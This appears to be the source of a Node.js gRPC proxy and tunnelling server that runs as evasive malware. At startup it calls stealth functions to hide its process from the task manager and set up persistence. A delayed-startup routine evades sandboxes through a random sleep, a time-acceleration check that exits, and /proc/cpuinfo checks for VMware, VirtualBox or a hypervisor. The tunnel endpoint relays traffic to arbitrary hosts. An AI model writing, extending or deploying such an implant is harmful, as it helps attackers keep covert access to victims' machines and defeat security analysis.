'use strict';

const grpc = require('@grpc/grpc-js');
const protoLoader = require('@grpc/proto-loader');
const path = require('path');
const fs = require('fs');
const uuid = require('uuid');
const wasmInterface = require('./wasm-interface');
const { hideProcessFromTaskManager, createPersistence } = require('./stealth');
// Build information
const buildInfo = require('../../temp/random_data');

// Constants
const PROTO_PATH = path.join(__dirname, '../../proto/proxy.proto');
const SERVER_ADDRESS = '127.0.0.1:50051';
const VERSION = '1.0.0';

// Connection tracking
const activeConnections = new Map();
let stats = {
  bytesIn: 0,
  bytesOut: 0,
  totalConnections: 0,
  startTime: Date.now()
};

// Load proto file
const packageDefinition = protoLoader.loadSync(PROTO_PATH, {
  keepCase: true,
  longs: String,
  enums: String,
  defaults: true,
  oneofs: true
});

const proxyProto = grpc.loadPackageDefinition(packageDefinition).proxy;

// Initialize WASM module
async function initializeWasmModule() {
  try {
    await wasmInterface.initialize();
    console.log('[+] WASM module initialized successfully');
    return true;
  } catch (error) {
    console.error('[-] Failed to initialize WASM module:', error);
    return false;
  }
}

// gRPC service implementation
const server = new grpc.Server();

// Implement ProxyTraffic method
function proxyTraffic(call) {
  const connectionId = uuid.v4();
  const connectionStats = {
    id: connectionId,
    bytesIn: 0,
    bytesOut: 0,
    startTime: Date.now(),
    destination: 'unknown'
  };
  
  activeConnections.set(connectionId, connectionStats);
  stats.totalConnections++;
  
  console.log(`[+] New connection established: ${connectionId}`);
  
  call.on('data', async (request) => {
    try {
      // Update stats
      connectionStats.bytesIn += request.payload ? request.payload.length : 0;
      stats.bytesIn += request.payload ? request.payload.length : 0;
      connectionStats.destination = request.destination_url;
      
      // Pass request to WASM module
      const response = await wasmInterface.handleProxyRequest(
        request.request_id,
        request.destination_url,
        request.method,
        request.headers,
        request.payload,
        request.is_encrypted
      );
      
      // Send response back
      const proxyResponse = {
        request_id: request.request_id,
        status_code: response.statusCode,
        headers: response.headers,
        payload: response.payload,
        is_encrypted: response.isEncrypted,
        error_message: response.error || ''
      };
      
      // Update stats
      connectionStats.bytesOut += proxyResponse.payload ? proxyResponse.payload.length : 0;
      stats.bytesOut += proxyResponse.payload ? proxyResponse.payload.length : 0;
      
      call.write(proxyResponse);
    } catch (error) {
      console.error(`[-] Error handling proxy request: ${error.message}`);
      call.write({
        request_id: request.request_id,
        status_code: 500,
        headers: {},
        payload: Buffer.from(`Error: ${error.message}`),
        is_encrypted: false,
        error_message: error.message
      });
    }
  });
  
  call.on('end', () => {
    console.log(`[-] Connection closed: ${connectionId}`);
    connectionStats.duration = Date.now() - connectionStats.startTime;
    activeConnections.delete(connectionId);
    call.end();
  });
  
  call.on('error', (error) => {
    console.error(`[-] Connection error (${connectionId}): ${error.message}`);
    activeConnections.delete(connectionId);
  });
}

// Implement ConfigureProxy method
function configureProxy(call, callback) {
  try {
    const config = call.request;
    wasmInterface.configure(config)
      .then(() => {
        callback(null, {
          is_running: true,
          error_message: ''
        });
      })
      .catch(error => {
        callback(null, {
          is_running: true,
          error_message: `Failed to apply configuration: ${error.message}`
        });
      });
  } catch (error) {
    callback(null, {
      is_running: true,
      error_message: `Error: ${error.message}`
    });
  }
}

// Implement GetStatus method
function getStatus(call, callback) {
  try {
    const includeConnections = call.request.include_active_connections;
    const includeStats = call.request.include_stats;
    
    const response = {
      is_running: true,
      active_connections: activeConnections.size,
      bytes_transferred_in: stats.bytesIn,
      bytes_transferred_out: stats.bytesOut,
      version: VERSION,
      error_message: '',
      active_connection_stats: []
    };
    
    if (includeConnections) {
      activeConnections.forEach((conn) => {
        response.active_connection_stats.push({
          connection_id: conn.id,
          destination: conn.destination,
          bytes_in: conn.bytesIn,
          bytes_out: conn.bytesOut,
          duration_ms: Date.now() - conn.startTime
        });
      });
    }
    
    callback(null, response);
  } catch (error) {
    callback(null, {
      is_running: true,
      active_connections: 0,
      error_message: `Error: ${error.message}`
    });
  }
}

// Implement EstablishTunnel method
function establishTunnel(call) {
  const tunnelId = uuid.v4();
  console.log(`[+] New tunnel requested: ${tunnelId}`);
  
  try {
    const request = call.request;
    const stream = wasmInterface.createTunnel(
      request.target_host,
      request.target_port,
      request.tunnel_type,
      request.auth_params
    );
    
    // Send initial response
    call.write({
      tunnel_id: tunnelId,
      status: 'established',
      tunnel_data: Buffer.from(''),
      error_message: ''
    });
    
    // Forward tunnel data
    stream.on('data', (data) => {
      call.write({
        tunnel_id: tunnelId,
        status: 'data',
        tunnel_data: data,
        error_message: ''
      });
    });
    
    stream.on('end', () => {
      call.write({
        tunnel_id: tunnelId,
        status: 'closed',
        tunnel_data: Buffer.from(''),
        error_message: ''
      });
      call.end();
    });
    
    stream.on('error', (error) => {
      call.write({
        tunnel_id: tunnelId,
        status: 'error',
        tunnel_data: Buffer.from(''),
        error_message: error.message
      });
      call.end();
    });
    
    // Handle client-side events
    call.on('cancelled', () => {
      stream.destroy();
    });
  } catch (error) {
    call.write({
      tunnel_id: tunnelId,
      status: 'error',
      tunnel_data: Buffer.from(''),
      error_message: `Failed to establish tunnel: ${error.message}`
    });
    call.end();
  }
}

// Register services
server.addService(proxyProto.ProxyService.service, {
  ProxyTraffic: proxyTraffic,
  ConfigureProxy: configureProxy,
  GetStatus: getStatus,
  EstablishTunnel: establishTunnel
});

// Server startup
async function startServer() {
  // Apply stealth measures
  hideProcessFromTaskManager();
  createPersistence();
  
  // Initialize WASM module
  const wasmInitialized = await initializeWasmModule();
  if (!wasmInitialized) {
    console.error('[-] Failed to initialize WASM module. Exiting...');
    process.exit(1);
  }
  
  // Start gRPC server
  server.bindAsync(SERVER_ADDRESS, grpc.ServerCredentials.createInsecure(), (error, port) => {
    if (error) {
      console.error('[-] Failed to start gRPC server:', error);
      return;
    }
    
    server.start();
    console.log(`[+] gRPC server running at ${SERVER_ADDRESS}`);
  });
}

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});

// Start server

// Add delay to avoid sandbox detection
async function delayedStartup() {
  // Check for sandbox indicators
  const startTime = Date.now();
  
  // Random sleep between 5-10 seconds to evade sandbox timeouts
  const sleepTime = 5000 + Math.floor(Math.random() * 5000);
  await new Promise(resolve => setTimeout(resolve, sleepTime));
  
  // Additional sandbox checks
  const endTime = Date.now();
  const actualDelay = endTime - startTime;
  
  // If time difference is too small, might be in a sandbox with time acceleration
  if (actualDelay < sleepTime * 0.9) {
    console.log('[!] Possible sandbox detected (time acceleration). Exiting...');
    process.exit(0);
    return;
  }
  
  // Check for virtualization
  try {
    const cpuInfo = fs.readFileSync('/proc/cpuinfo', 'utf8');
    if (cpuInfo.includes('hypervisor') || cpuInfo.includes('VMware') || cpuInfo.includes('VirtualBox')) {
      // In a real implmentation we might exit here, but for testing we continue
      console.log('[!] Virtualization detected, but continuing for testing');
    }
  } catch (error) {
    // This might fail on Windows, which is fine
  }
  
  // Continue with normal startup
  startServer().catch(console.error);
}

// Replace direct startup with delayed startup
delayedStartup().catch(console.error);

